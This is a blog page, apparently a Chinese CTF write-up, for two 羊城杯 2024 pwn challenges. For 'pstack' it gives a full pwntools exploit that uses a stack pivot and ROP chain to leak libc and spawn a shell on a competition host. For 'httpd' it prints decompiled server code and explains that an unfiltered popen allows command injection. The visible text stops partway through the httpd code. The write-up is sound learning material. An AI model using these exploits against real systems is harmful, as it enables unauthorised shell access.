<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>羊城杯2024pwn | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="题目附件https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn
pstack程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell
from pwn import *

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

is_debug = 0
IP = &#34;139.155.126.78&#34;
PORT = 32922
elf = context.binary = ELF(&#39;./pwn&#39;)
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)

p = connect()

rdi=0x0000000000400773
rbp=0x00000000004005b0
leave_ret=0x4006DB
ret=0x4006DC
vuln=0x4006C4

payload = flat([
    b&#39;a&#39; * 0x30,0x601730,vuln
])
sa(&#34;Can you grasp this little bit of overflow?&#34;,payload)

payload = flat([
    rdi,elf.got[&#39;read&#39;],elf.plt[&#39;puts&#39;],
    rbp,0x601a30,vuln,
    0x6016f8,leave_ret
])
s(payload)
rl()
libc_base = u64(r(6).ljust(8,b&#39;\x00&#39;)) -libc.sym[&#39;read&#39;]
success(hex(libc_base))

system = libc_base + libc.sym[&#39;system&#39;]
binsh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

payload = flat([
    rdi,binsh,system,b&#39;a&#39; * 0x18,
    0x6019f8,leave_ret
])
s(payload)

p.interactive()

httpd// bad sp value at call has been detected, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
&amp;#123;
  int v3; // eax
  int v4; // eax
  int result; // eax
  int v6; // eax
  int v7; // eax
  struct tm *v8; // eax
  __time_t tv_sec; // edi
  int st_size; // esi
  const char *v11; // eax
  struct dirent **namelist; // [esp+8h] [ebp-14134h] BYREF
  int v13; // [esp+Ch] [ebp-14130h] BYREF
  int v14; // [esp+10h] [ebp-1412Ch] BYREF
  int v15; // [esp+14h] [ebp-14128h] BYREF
  int v16; // [esp+18h] [ebp-14124h] BYREF
  char v17; // [esp+1Ch] [ebp-14120h] BYREF
  char *haystack; // [esp+20h] [ebp-1411Ch]
  int i; // [esp+24h] [ebp-14118h]
  size_t v20; // [esp+28h] [ebp-14114h]
  char *has_host; // [esp+2Ch] [ebp-14110h]
  char *v22; // [esp+30h] [ebp-1410Ch]
  int stdout_fd; // [esp+34h] [ebp-14108h]
  int v24; // [esp+38h] [ebp-14104h]
  FILE *stream; // [esp+3Ch] [ebp-14100h]
  int v26; // [esp+40h] [ebp-140FCh]
  FILE *v27; // [esp+44h] [ebp-140F8h]
  int c; // [esp+48h] [ebp-140F4h]
  struct stat v29; // [esp+4Ch] [ebp-140F0h] BYREF
  char modes[2]; // [esp+A6h] [ebp-14096h] BYREF
  char v31[16]; // [esp+A8h] [ebp-14094h] BYREF
  char v32[116]; // [esp+B8h] [ebp-14084h] BYREF
  char v33[1908]; // [esp+12Ch] [ebp-14010h] BYREF
  char input_data[10000]; // [esp+8A0h] [ebp-1389Ch] BYREF
  char httpMethod[10000]; // [esp+2FB0h] [ebp-1118Ch] BYREF
  char requestPath; // [esp+56C0h] [ebp-EA7Ch] BYREF
  char v37[9999]; // [esp+56C1h] [ebp-EA7Bh] BYREF
  char httpVersion[10000]; // [esp+7DD0h] [ebp-C36Ch] BYREF
  char file[20000]; // [esp+A4E0h] [ebp-9C5Ch] BYREF
  char v40[15588]; // [esp+F300h] [ebp-4E3Ch] BYREF
  __int64 v41; // [esp+12FE4h] [ebp-1158h]
  char *v42; // [esp+12FECh] [ebp-1150h]
  int v43; // [esp+1312Ch] [ebp-1010h] BYREF
  unsigned int v44; // [esp+14120h] [ebp-1Ch]
  int *p_argc; // [esp+1412Ch] [ebp-10h]

  p_argc = &amp;amp;argc;
  while ( &amp;amp;v43 != (int *)v33 )
    ;
  v44 = __readgsdword(0x14u);
  memset(&amp;amp;v33[884], 0, 1024);
  v20 = 0;
  strcpy(modes, &#34;r&#34;);
  if ( chdir(&#34;/home/ctf/html&#34;) &amp;lt; 0 )
    puts_error(500, (int)&#34;Internal Error&#34;, 0, &#34;Config error - couldn&#39;t chdir().&#34;);
  if ( !fgets(input_data, 10000, stdin) )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;No request found.&#34;);
  if ( __isoc99_sscanf(input_data, &#34;%[^ ] %[^ ] %[^ ]&#34;, httpMethod, &amp;amp;requestPath, httpVersion) != 3 )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Can&#39;t parse request.&#34;);
  if ( !fgets(input_data, 10000, stdin) )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Missing Host.&#34;);
  has_host = strstr(input_data, &#34;Host: &#34;);
  if ( !has_host )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Missing Host.&#34;);
  v22 = strstr(has_host + 6, &#34;\r\n&#34;);
  if ( v22 )
  &amp;#123;
    *v22 = 0;
  &amp;#125;
  else
  &amp;#123;
    v22 = strchr(has_host + 6, (int)&#34;\n&#34;);
    if ( v22 )
      *v22 = 0;
  &amp;#125;
  if ( strlen(has_host + 6) &amp;lt;= 7 )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Host len error.&#34;);
  if ( has_host == (char *)-6 || !has_host[6] )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Host fmt error.&#34;);
  v42 = &amp;amp;v17;
  HIDWORD(v41) = &amp;amp;v16;
  __isoc99_sscanf(has_host + 6, &#34;%d.%d.%d.%d%c&#34;, &amp;amp;v13, &amp;amp;v14, &amp;amp;v15);
  if ( !fgets(input_data, 10000, stdin) )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Missing Content-Length.&#34;);
  has_host = strstr(input_data, &#34;Content-Length: &#34;);
  if ( !has_host )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Missing Content-Length.&#34;);
  v22 = strstr(has_host + 16, &#34;\r\n&#34;);
  if ( v22 )
  &amp;#123;
    *v22 = 0;
  &amp;#125;
  else
  &amp;#123;
    v22 = strchr(has_host + 16, (int)&#34;\n&#34;);
    if ( v22 )
      *v22 = 0;
  &amp;#125;
  if ( strlen(has_host + 16) &gt; 5 )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Content-Length len too long.&#34;);
  if ( strcasecmp(httpMethod, &#34;get&#34;) )
    puts_error(501, (int)&#34;Not Implemented&#34;, 0, &#34;That method is not implemented.&#34;);
  if ( strncmp(httpVersion, &#34;HTTP/1.0&#34;, 8u) )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Bad protocol.&#34;);
  if ( requestPath != 47 )
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Bad filename.&#34;);
  haystack = v37;
  urldecode(v37, v37);
  if ( !*haystack )
    haystack = &#34;./&#34;;
  v20 = strlen(haystack);
  if ( *haystack == &#39;/&#39;                         // 目录穿越检查
    || !strcmp(haystack, &#34;..&#34;)
    || !strncmp(haystack, &#34;../&#34;, 3u)
    || strstr(haystack, &#34;/../&#34;)
    || !strcmp(&amp;amp;haystack[v20 - 3], &#34;/..&#34;) )
  &amp;#123;
    puts_error(400, (int)&#34;Bad Request&#34;, 0, &#34;Illegal filename.&#34;);
  &amp;#125;
  if ( !sub_1F74(haystack) )
    puts_error(404, (int)&#34;Not Found&#34;, 0, &#34;Invalid file name.&#34;);
  v3 = fileno(stdout);
  stdout_fd = dup(v3);
  v4 = fileno(stderr);
  v24 = dup(v4);
  freopen(&#34;/dev/null&#34;, &#34;w&#34;, stdout);
  freopen(&#34;/dev/null&#34;, &#34;w&#34;, stderr);
  stream = popen(haystack, modes);
  if ( stream )
  &amp;#123;
    pclose(stream);
    v6 = fileno(stdout);
    dup2(stdout_fd, v6);
    v7 = fileno(stderr);
    dup2(v24, v7);
    close(stdout_fd);
    close(v24);
    if ( stat(haystack, &amp;amp;v29) &amp;lt; 0 )
      puts_error(404, (int)&#34;Not Found&#34;, 0, &#34;File not found.&#34;);
    if ( (v29.st_mode &amp;amp; 0xF000) == 0x4000 )
    &amp;#123;
      if ( haystack[v20 - 1] != 47 )
      &amp;#123;
        snprintf(v40, 0x4E20u, &#34;Location: %s/&#34;, &amp;amp;requestPath);
        puts_error(302, (int)&#34;Found&#34;, (int)v40, &#34;Directories must end with a slash.&#34;);
      &amp;#125;
      snprintf(file, 0x4E20u, &#34;%sindex.html&#34;, haystack);
      if ( stat(file, &amp;amp;v29) &amp;lt; 0 )
      &amp;#123;
        sub_23D9(200, &#34;Ok&#34;, 0, (int)&#34;text/html&#34;, -1, v29.st_mtim.tv_sec);
        v26 = scandir(haystack, &amp;amp;namelist, 0, (int (*)(const void *, const void *))&amp;amp;alphasort);
        if ( v26 &gt;= 0 )
        &amp;#123;
          for ( i = 0; i &amp;lt; v26; ++i )
          &amp;#123;
            sub_2704(v32, 0x3E8u, (unsigned __int8 *)namelist[i]-&gt;d_name);
            snprintf(file, 0x4E20u, &#34;%s/%s&#34;, haystack, namelist[i]-&gt;d_name);
            if ( lstat(file, &amp;amp;v29) &gt;= 0 )
            &amp;#123;
              v8 = localtime(&amp;amp;v29.st_mtim.tv_sec);
              strftime(v31, 0x10u, &#34;%d%b%Y %H:%M&#34;, v8);
              printf(&#34;&amp;lt;a href=\&#34;%s\&#34;&gt;%-32.32s&amp;lt;/a&gt;%15s %14lld\n&#34;, v32, namelist[i]-&gt;d_name, v31, (__int64)v29.st_size);
              sub_20C6(file);
            &amp;#125;
            else
            &amp;#123;
              printf(&#34;&amp;lt;a href=\&#34;%s\&#34;&gt;%-32.32s&amp;lt;/a&gt;    ???\n&#34;, v32, namelist[i]-&gt;d_name);
            &amp;#125;
            printf(
              &#34;&amp;lt;/pre&gt;\n&amp;lt;hr&gt;\n&amp;lt;address&gt;&amp;lt;a href=\&#34;%s\&#34;&gt;%s&amp;lt;/a&gt;&amp;lt;/address&gt;\n&amp;lt;/body&gt;&amp;lt;/html&gt;\n&#34;,
              &#34;https://2024ycb.dasctf.com/&#34;,
              &#34;YCB2024&#34;);
          &amp;#125;
        &amp;#125;
        else
        &amp;#123;
          perror(&#34;scandir&#34;);
        &amp;#125;
        goto LABEL_74;
      &amp;#125;
      haystack = file;
    &amp;#125;
    v27 = fopen(haystack, &#34;r&#34;);
    if ( !v27 )
      puts_error(403, (int)&#34;Forbidden&#34;, 0, &#34;File is protected.&#34;);
    tv_sec = v29.st_mtim.tv_sec;
    st_size = v29.st_size;
    v11 = sub_2566(haystack);
    sub_23D9(200, &#34;Ok&#34;, 0, (int)v11, st_size, tv_sec);
    while ( 1 )
    &amp;#123;
      c = getc(v27);
      if ( c == -1 )
        break;
      putchar(c);
    &amp;#125;
LABEL_74:
    fflush(stdout);
    exit(0);
  &amp;#125;
  result = -1;
  if ( v44 != __readgsdword(0x14u) )
    check_canary();
  return result;
&amp;#125;

程序的逻辑很长，实现了一个http request parse，然后相应请求，大多数逻辑都是对http request的格式做判断，还有目录穿越的检查
漏洞出在这里popen这里


这个popen会fork一个子进程，然后调用shell，把参数传过去，也没有做过滤，所以可以通过这里执行命令


exp"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="羊城杯2024pwn"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the catergories.">
			  <i class=""></i>Catergories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 羊城杯2024pwn</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn">https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn</a></p>
<h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"139.155.126.78"</span>
PORT <span class="token operator">=</span> <span class="token number">32922</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

rdi<span class="token operator">=</span><span class="token number">0x0000000000400773</span>
rbp<span class="token operator">=</span><span class="token number">0x00000000004005b0</span>
leave_ret<span class="token operator">=</span><span class="token number">0x4006DB</span>
ret<span class="token operator">=</span><span class="token number">0x4006DC</span>
vuln<span class="token operator">=</span><span class="token number">0x4006C4</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x601730</span><span class="token punctuation">,</span>vuln
<span class="token punctuation">]</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Can you grasp this little bit of overflow?"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    rdi<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    rbp<span class="token punctuation">,</span><span class="token number">0x601a30</span><span class="token punctuation">,</span>vuln<span class="token punctuation">,</span>
    <span class="token number">0x6016f8</span><span class="token punctuation">,</span>leave_ret
<span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">,</span>
    <span class="token number">0x6019f8</span><span class="token punctuation">,</span>leave_ret
<span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> bad sp value at call has been detected<span class="token punctuation">,</span> the output may be wrong!
<span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> v3<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> result<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v6<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v7<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  struct tm <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  __time_t tv_sec<span class="token punctuation">;</span> <span class="token operator">//</span> edi
  <span class="token builtin">int</span> st_size<span class="token punctuation">;</span> <span class="token operator">//</span> esi
  const char <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  struct dirent <span class="token operator">**</span>namelist<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14134h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v13<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14130h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v14<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1412Ch<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v15<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>14h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14128h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> v16<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14124h<span class="token punctuation">]</span> BYREF
  char v17<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14120h<span class="token punctuation">]</span> BYREF
  char <span class="token operator">*</span>haystack<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1411Ch<span class="token punctuation">]</span>
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>24h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14118h<span class="token punctuation">]</span>
  size_t v20<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14114h<span class="token punctuation">]</span>
  char <span class="token operator">*</span>has_host<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14110h<span class="token punctuation">]</span>
  char <span class="token operator">*</span>v22<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>30h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1410Ch<span class="token punctuation">]</span>
  <span class="token builtin">int</span> stdout_fd<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>34h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14108h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v24<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14104h<span class="token punctuation">]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>3Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14100h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v26<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>40h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140FCh<span class="token punctuation">]</span>
  FILE <span class="token operator">*</span>v27<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>44h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F8h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> c<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>48h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F4h<span class="token punctuation">]</span>
  struct stat v29<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>4Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F0h<span class="token punctuation">]</span> BYREF
  char modes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A6h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14096h<span class="token punctuation">]</span> BYREF
  char v31<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14094h<span class="token punctuation">]</span> BYREF
  char v32<span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>B8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14084h<span class="token punctuation">]</span> BYREF
  char v33<span class="token punctuation">[</span><span class="token number">1908</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14010h<span class="token punctuation">]</span> BYREF
  char input_data<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>8A0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1389Ch<span class="token punctuation">]</span> BYREF
  char httpMethod<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2FB0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1118Ch<span class="token punctuation">]</span> BYREF
